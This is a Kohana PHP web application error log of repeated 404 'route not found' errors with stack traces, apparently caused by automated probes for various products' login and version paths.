2025-10-24 13:20:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Portal0000.htm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Portal0000.htm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75} was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75} was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: human.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: human.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL dniapi/userInfos was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL dniapi/userInfos was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL HNAP1 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL HNAP1 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:40 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL user was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:40 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL user was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: +CSCOE+/logon.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: +CSCOE+/logon.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:40 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: human.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:40 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: human.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL __Additional was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL __Additional was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL pools/default/buckets was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL pools/default/buckets was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dana-na/nc/nc_gina_ver.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dana-na/nc/nc_gina_ver.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL HNAP1 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL HNAP1 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/v2/about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 13:20:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/v2/about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL webui was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL webui was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/v2/about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 13:20:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/v2/about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: CSS/Miniweb.css ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: CSS/Miniweb.css ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/info.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/info.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL pools was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL pools was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:41 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dana-cached/hc/HostCheckerInstaller.osx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:41 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dana-cached/hc/HostCheckerInstaller.osx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL Cm6v was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL Cm6v was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL sdk was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL sdk was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL Account/Login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL Account/Login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:41 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL dniapi/userInfos was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:41 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL dniapi/userInfos was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: geoserver/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: xml/info.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: geoserver/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: xml/info.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: +CSCOE+/logon.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: +CSCOE+/logon.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: geoserver/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: geoserver/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: fog/management/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: fog/management/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: docs/cplugError.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: docs/cplugError.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:42 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL webui was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:42 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL webui was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:42 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cluster/list.query ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:42 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cluster/list.query ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apps/zxtm/login.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apps/zxtm/login.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:43 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL geoserver was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:43 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL geoserver was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/manifests/files/joomla.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: administrator/manifests/files/joomla.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/info.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/info.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: language/en-GB/en-GB.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: language/en-GB/en-GB.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:43 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL versa/login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:43 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL versa/login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:43 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dana-cached/hc/HostCheckerInstaller.osx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:43 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dana-cached/hc/HostCheckerInstaller.osx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: fog/management/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: fog/management/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL owa was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL owa was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/v1/check-version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 13:20:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/v1/check-version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: images/logo.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: images/logo.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:44 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: rest/applinks/1.0/manifest ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:44 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: rest/applinks/1.0/manifest ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:44 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL Account/Login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:44 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL Account/Login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:45 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phoenix/favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:45 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phoenix/favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:45 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL status was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:45 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL status was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:45 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-24 13:20:45 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-24 13:20:45 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 13:20:45 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:45 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL pools/default/buckets was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:45 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL pools/default/buckets was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:45 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL magento_version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:45 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL magento_version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:46 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL webui was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:46 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL webui was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: assets/png/favicon-abe32304.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: assets/png/favicon-abe32304.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: xml/info.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: xml/info.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: scripts/WPnBr.dll ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: scripts/WPnBr.dll ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
